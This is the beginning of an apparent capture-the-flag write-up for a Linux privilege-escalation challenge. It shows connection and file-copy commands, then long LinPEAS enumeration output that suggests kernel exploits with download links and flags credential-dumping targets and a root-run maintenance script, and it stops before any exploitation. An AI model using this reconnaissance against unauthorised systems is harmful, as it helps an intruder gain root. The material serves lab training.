> Average linux privesc, pls get flag kthxbye.

Connect with ssh -o "ProxyCommand=ncat --ssl 7957fd6d-67f2-4e09-897d-388a9471222d.openec.sc.openec.sc 31337" user@localhost # pass is user.

ssh -o "ProxyCommand=ncat --ssl 7957fd6d-67f2-4e09-897d-388a9471222d.openec.sc 31337" user@localhost

# Linpeas

We do not have wget or curl, so we need to do old copy paste ...

```sh
scp -o 'ProxyCommand=ncat --ssl 7957fd6d-67f2-4e09-897d-388a9471222d.openec.sc 31337' \
    ./localfile.txt user@localhost:/remote/path/remote.txt

scp -o 'ProxyCommand=ncat --ssl 7957fd6d-67f2-4e09-897d-388a9471222d.openec.sc 31337' \
    user@localhost:/remote/path/remote.txt ./localfile.txt
```

`scp -o 'ProxyCommand=ncat --ssl 7957fd6d-67f2-4e09-897d-388a9471222d.openec.sc 31337' ./linpeas.sh user@localhost:/home/user/linpeas.sh`

```
user@organization:~$ ./linpeas.sh 



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          LinPEAS-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 6.12.45-talos (root@buildkitsandbox) (gcc (GCC) 14.3.0, GNU ld (GNU Binutils) 2.44) #1 SMP Fri Sep  5 14:37:08 UTC 2025
User & Groups: uid=1000(user) gid=1000(user) groups=1000(user)
Hostname: organization

[-] No network discovery capabilities (fping or ping not found)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)


Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
Linux version 6.12.45-talos (root@buildkitsandbox) (gcc (GCC) 14.3.0, GNU ld (GNU Binutils) 2.44) #1 SMP Fri Sep  5 14:37:08 UTC 2025
lsb_release Not Found

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.9.13p3


╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses
/usr/local/bin:/usr/local/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

╔══════════╣ Date & uptime
Sat Oct  4 05:11:55 UTC 2025
 05:11:55 up 5 days, 11:46,  0 user,  load average: 0.76, 0.61, 0.58

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)

╔══════════╣ Environment
╚ Any private information inside environment variables?
USER=user
SSH_CLIENT=10.0.136.207 41296 22
SHLVL=1
MOTD_SHOWN=pam
HOME=/home/user
SSH_TTY=/dev/pts/0
LOGNAME=user
_=./linpeas.sh
TERM=xterm-256color
LANG=en_US.UTF-8
SHELL=/bin/bash
PWD=/home/user
SSH_CONNECTION=10.0.136.207 41296 10.0.135.201 22

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded


╔══════════╣ Protections
═╣ AppArmor enabled? .............. /etc/apparmor.d
═╣ AppArmor profile? .............. system_u:system_r:pod_t:s0═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... enabled
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (container-other)

╔══════════╣ Kernel Modules Information
══╣ Kernel modules with weak perms?
/lib/modules Not Found

══╣ Kernel modules loadable? 
Modules can be loaded



                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present (if any):
/usr/bin/nsenter
/usr/bin/unshare
/usr/sbin/chroot

╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No



                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
Learn and practice cloud hacking techniques in https://training.hacktricks.xyz

═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM or Az metadata? ............. No
═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
═╣ Azure Automation Account? ............ No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? ......................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes
root          1  0.0  0.0  37028 30908 ?        Ss   05:02   0:00 /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisor/conf.d/supervisord.conf
user        531  0.0  0.0  17876  6788 ?        S    05:09   0:00      _ sshd: user@pts/0
user        532  0.0  0.0   4196  3676 pts/0    Ss   05:09   0:00          _ -bash
user        656  0.4  0.0   3528  2556 pts/0    S+   05:11   0:00              _ /bin/sh ./linpeas.sh
user       2898  0.0  0.0   3528  1580 pts/0    S+   05:12   0:00                  _ /bin/sh ./linpeas.sh
user       2900  0.0  0.0   3932  2828 pts/0    S+   05:12   0:00                  |   _ /bin/bash /usr/local/bin/ps fauxwww
user       2903  0.0  0.0   8096  4348 pts/0    R+   05:12   0:00                  |       _ /bin/ps fauxwww
user       2902  0.0  0.0   3528  1580 pts/0    S+   05:12   0:00                  _ /bin/sh ./linpeas.sh
root         15  0.0  0.0   4308  3224 ?        S    05:02   0:00 /bin/bash /opt/sys_maintenance
root         22  0.0  0.0   4308  2312 ?        S    05:02   0:00  _ /bin/bash /opt/sys_maintenance
root       2857  0.0  0.0   2868  1704 ?        S    05:12   0:00      _ sleep 5

╔══════════╣ Processes with unusual configurations
Process 1 (root) - /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisor/conf.d/supervisord.conf 
SELinux context: system_u:system_r:pod_t:s0

Process 14 (root) - sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
SELinux context: system_u:system_r:pod_t:s0

Process 15 (root) - /bin/bash /opt/sys_maintenance 
SELinux context: system_u:system_r:pod_t:s0

Process 16 (root) - /usr/bin/Xvfb :99 -screen 0 1024x768x24 -ac -nolisten tcp 
SELinux context: system_u:system_r:pod_t:s0

Process 22 (root) - /bin/bash /opt/sys_maintenance 
SELinux context: system_u:system_r:pod_t:s0

Process 520 (root) - sshd: user [priv]    
SELinux context: system_u:system_r:pod_t:s0

Process 531 (user) - sshd: user@pts/0     
SELinux context: system_u:system_r:pod_t:s0

Process 532 (user) - -bash 
SELinux context: system_u:system_r:pod_t:s0

Process 656 (user) - /bin/sh ./linpeas.sh 
SELinux context: system_u:system_r:pod_t:s0


╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 Not Found
sshd: process found (dump creds from memory as root)
mysql Not Found
postgres Not Found
redis-server Not Found
mongod Not Found
memcached Not Found
elasticsearch Not Found
jenkins Not Found
tomcat Not Found
nginx Not Found
php-fpm Not Found
supervisord process found (dump creds from memory as root)
vncserver Not Found
xrdp Not Found
teamviewer Not Found

╔══════════╣ Opened Files by processes
Process 532 (user) - -bash 
  └─ Has open files:
    └─ /dev/pts/0

╔══════════╣ Processes with memory-mapped credential files

╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information

╔══════════╣ Check for vulnerable cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
══╣ Cron jobs list
crontab Not Found
incrontab Not Found
/etc/cron.d:
total 4
drwxr-xr-x. 2 root root  25 Sep  8 00:00 .
drwxr-xr-x. 1 root root  19 Oct  4 05:02 ..
-rw-r--r--. 1 root root 201 Jun  6 17:12 e2scrub_all

/etc/cron.daily:
total 12
drwxr-xr-x. 1 root root   20 Sep 27 15:53 .
drwxr-xr-x. 1 root root   19 Oct  4 05:02 ..
-rwxr-xr-x. 1 root root 1478 May 25  2023 apt-compat
-rwxr-xr-x. 1 root root  123 Mar 27  2023 dpkg
-rwxr-xr-x. 1 root root 1395 Mar 12  2023 man-db

/etc/cron.weekly:
total 4
drwxr-xr-x. 2 root root   20 Sep 27 15:53 .
drwxr-xr-x. 1 root root   19 Oct  4 05:02 ..
-rwxr-xr-x. 1 root root 1055 Mar 12  2023 man-db

══╣ Checking for specific cron jobs vulnerabilities
Checking cron directories...

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers
══╣ Active timers:
══╣ Disabled timers:
══╣ Additional timer files:

╔══════════╣ Services and Service Files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services

══╣ Active services:

══╣ Disabled services:
console-getty.service                  disabled disabled
debug-shell.service                    disabled disabled
serial-getty@.service                  disabled enabled
systemd-boot-check-no-failures.service disabled disabled
systemd-network-generator.service      disabled enabled
systemd-networkd-wait-online.service   disabled disabled
systemd-networkd-wait-online@.service  disabled enabled
systemd-networkd.service               disabled enabled
systemd-sysext.service                 disabled enabled
systemd-time-wait-sync.service         disabled disabled
10 unit files listed.

══╣ Additional service files:
  Potential issue in service file: /usr/lib/systemd/system/getty-static.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service file: /usr/lib/systemd/system/getty.target.wants/getty-static.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service file: /usr/lib/systemd/system/initrd-cleanup.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service file: /usr/lib/systemd/system/initrd-parse-etc.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service file: /usr/lib/systemd/system/initrd-switch-root.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service file: /usr/lib/systemd/system/initrd-udevadm-cleanup-db.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service file: /usr/lib/systemd/system/sysinit.target.wants/systemd-firstboot.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service file: /usr/lib/systemd/system/sysinit.target.wants/systemd-journal-flush.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service file: /usr/lib/systemd/system/sysinit.target.wants/systemd-machine-id-commit.service
  └─ RELATIVE_PATH: Could be executing some relative path
You can't write on systemd PATH

╔══════════╣ Systemd Information
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths
═╣ Systemd version and vulnerabilities? .............. 252.39
═╣ Services running as root? ..... 
═╣ Running services with dangerous capabilities? ... 
═╣ Services with writable paths? . 
╔══════════╣ Systemd PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets

╔══════════╣ Unix Sockets Analysis
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
/tmp/.X11-unix/X99
  └─(Read Write Execute (Weak Permissions: 777) )
  └─(Owned by root)

╔══════════╣ D-Bus Analysis
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus
busctl Not Found

╔══════════╣ D-Bus Configuration Files

══╣ D-Bus Session Bus Analysis
(Access to session bus available)


╔══════════╣ Legacy r-commands (rsh/rlogin/rexec) and host-based trust

══╣ Listening r-services (TCP 512-514)
ss|netstat Not Found

══╣ systemd units exposing r-services
rlogin|rsh|rexec units Not Found

══╣ inetd/xinetd configuration for r-services
/etc/inetd.conf Not Found
/etc/xinetd.d Not Found

══╣ Installed r-service server packages
  No related packages found via dpkg

══╣ /etc/hosts.equiv and /etc/shosts.equiv

══╣ Per-user .rhosts files
.rhosts Not Found

══╣ PAM rhosts authentication
/etc/pam.d/rlogin|rsh Not Found

══╣ SSH HostbasedAuthentication
  HostbasedAuthentication no or not set

══╣ Potential DNS control indicators (local)
  Not detected



                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Interfaces
Network Interfaces from /proc/net/dev:
----------------------------------------
Interface: lo
  MAC: 00:00:00:00:00:00
  State: unknown

Interface: tunl0
  MAC: 00:00:00:00
  State: down

Interface: sit0
  MAC: 00:00:00:00
  State: down

Interface: ip6tnl0
  MAC: 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
  State: down

Interface: eth0
  MAC: 8e:e5:4e:10:5a:8b
  State: up

Additional IP Information from fib_trie:
----------------------------------------
Network: 

╔══════════╣ Hostname, hosts and DNS
══╣ Hostname Information
System hostname: organization
FQDN: organization

══╣ Hosts File Information
Contents of /etc/hosts:
  127.0.0.1     localhost
  ::1   localhost ip6-localhost ip6-loopback
  fe00::0       ip6-localnet
  fe00::0       ip6-mcastprefix
  fe00::1       ip6-allnodes
  fe00::2       ip6-allrouters
  10.0.135.201  organization

══╣ DNS Configuration
DNS Servers (resolv.conf):
  search challenge-fb300cea-fa25-5ff1-9f33-095f9d9836b2.svc.cluster.local svc.cluster.local cluster.local
  10.0.96.10
-e 
DNS Domain Information:


╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active tcp Ports (from /proc/net/tcp)
Proto  Recv-Q  Send-Q  Local Address          Foreign Address        State       PID/Program name
--------------------------------------------------------------------------------
tcp    00:00000000 00000000:00000000 0.0.0.0:22            0.0.0.0:0             LISTEN       /

══╣ Active udp Ports (from /proc/net/udp)
Proto  Recv-Q  Send-Q  Local Address          Foreign Address        State       PID/Program name
--------------------------------------------------------------------------------


╔══════════╣ Network Traffic Analysis Capabilities

══╣ Available Sniffing Tools
No sniffing tools found

══╣ Network Interfaces Sniffing Capabilities
Interface bonding_masters: Not sniffable
Interface eth0: Not sniffable
Interface ip6tnl0: Not sniffable
Interface sit0: Not sniffable
Interface tunl0: Not sniffable
No sniffable interfaces found

╔══════════╣ Firewall Rules Analysis

══╣ Iptables Rules
iptables Not Found

══╣ Nftables Rules
nftables Not Found

══╣ Firewalld Rules
firewalld Not Found

══╣ UFW Rules
ufw Not Found

╔══════════╣ Inetd/Xinetd Services Analysis

══╣ Inetd Services
inetd Not Found

══╣ Xinetd Services
xinetd Not Found

══╣ Running Inetd/Xinetd Services
-e 
Running Service Processes:

╔══════════╣ Internet Access?
Neither curl nor wget available
  ping not found
Port 443 is not accessible
DNS is not accessible
Port 80 is not accessible



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users
uid=1000(user) gid=1000(user) groups=1000(user)

╔══════════╣ PGP Keys and Related Files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#pgp-keys
GPG:
gpg Not Found
-e 
NetPGP:
netpgpkeys Not Found
-e 
PGP Related Files:

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid


╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens
ptrace protection is enabled (1)

doas.conf Not Found

╔══════════╣ Checking Pkexec and Polkit
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2

══╣ Polkit Binary

══╣ Polkit Policies
Checking /usr/share/polkit-1/rules.d/:
// This file is part of systemd.
// See systemd-networkd.service(8) and polkit(8) for more information.

// Allow systemd-networkd to set timezone, get product UUID,
// and transient hostname
polkit.addRule(function(action, subject) {
    if ((action.id == "org.freedesktop.hostname1.set-hostname" ||
         action.id == "org.freedesktop.hostname1.get-product-uuid" ||
         action.id == "org.freedesktop.timedate1.set-timezone") &&
        subject.user == "systemd-network") {
        return polkit.Result.YES;
    }
});

══╣ Polkit Authentication Agent

╔══════════╣ Superusers and UID 0 Users
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html

══╣ Users with UID 0 in /etc/passwd
root:x:0:0:root:/root:/bin/bash

══╣ Users with sudo privileges in sudoers

╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000::/home/user:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(messagebus) gid=101(messagebus) groups=101(messagebus)
uid=1000(user) gid=1000(user) groups=1000(user)
uid=101(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=42(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=997(systemd-timesync) gid=997(systemd-timesync) groups=997(systemd-timesync)
uid=998(systemd-network) gid=998(systemd-network) groups=998(systemd-network)

╔══════════╣ Currently Logged in Users

══╣ Basic user information
 05:13:25 up 5 days, 11:47,  0 user,  load average: 1.40, 0.90, 0.69
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

══╣ Active sessions
 05:13:25 up 5 days, 11:47,  0 user,  load average: 1.40, 0.90, 0.69
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

══╣ Logged in users (utmp)

══╣ SSH sessions

══╣ Screen sessions

══╣ Tmux sessions

╔══════════╣ Last Logons and Login History

══╣ Last logins

══╣ Failed login attempts

══╣ Recent logins from auth.log (limit 20)

══╣ Last time logon each user

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/perl
/usr/bin/python3
/usr/bin/sudo

╔══════════╣ Installed Compilers

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x. 1 root root 167 Sep 27 15:53 /etc/pam.d
-rw-r--r--. 1 root root 2133 Jul 28 11:59 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open


╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x. 2 root root 6 May 25  2023 /etc/apt/keyrings
drwxr-xr-x. 2 root root 4096 Sep  8 00:00 /usr/share/keyrings




╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r--. 1 root root 3526 Jun  6 14:38 /etc/skel/.bashrc
-rw-r--r--. 1 user user 3561 Oct  4 05:02 /home/user/.bashrc





-rw-r--r--. 1 root root 807 Jun  6 14:38 /etc/skel/.profile
-rw-r--r--. 1 user user 807 Jun  6 14:38 /home/user/.profile






MySQL process not found.
╔══════════╣ Analyzing PGP-GPG Files (limit 70)
gpg Not Found
netpgpkeys Not Found
netpgp Not Found

-rw-r--r--. 1 root root 8700 Apr  9 23:04 /usr/share/keyrings/debian-archive-bookworm-automatic.gpg
-rw-r--r--. 1 root root 8709 Apr  9 23:04 /usr/share/keyrings/debian-archive-bookworm-security-automatic.gpg
-rw-r--r--. 1 root root 280 Apr  9 23:04 /usr/share/keyrings/debian-archive-bookworm-stable.gpg
-rw-r--r--. 1 root root 8700 Apr  9 23:04 /usr/share/keyrings/debian-archive-bullseye-automatic.gpg
-rw-r--r--. 1 root root 8709 Apr  9 23:04 /usr/share/keyrings/debian-archive-bullseye-security-automatic.gpg
-rw-r--r--. 1 root root 2453 Apr  9 23:04 /usr/share/keyrings/debian-archive-bullseye-stable.gpg
-rw-r--r--. 1 root root 55918 Apr  9 23:04 /usr/share/keyrings/debian-archive-keyring.gpg
-rw-r--r--. 1 root root 72636 Apr  9 23:04 /usr/share/keyrings/debian-archive-removed-keys.gpg
-rw-r--r--. 1 root root 8698 Apr  9 23:04 /usr/share/keyrings/debian-archive-trixie-automatic.gpg
-rw-r--r--. 1 root root 8707 Apr  9 23:04 /usr/share/keyrings/debian-archive-trixie-security-automatic.gpg
-rw-r--r--. 1 root root 962 Apr  9 23:04 /usr/share/keyrings/debian-archive-trixie-stable.gpg


╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)





-rw-r--r--. 1 root root 182 Sep 27 15:53 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r--. 1 root root 102 Sep 27 15:53 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r--. 1 root root 574 Sep 27 15:53 /etc/ssh/ssh_host_rsa_key.pub

PermitRootLogin yes
PasswordAuthentication yes
UsePAM yes
══╣ Some certificates were found (out limited):
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068_2.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/CA_Disig_Root_R2.pem
656PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config
Include /etc/ssh/sshd_config.d/*.conf
KbdInteractiveAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes




                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
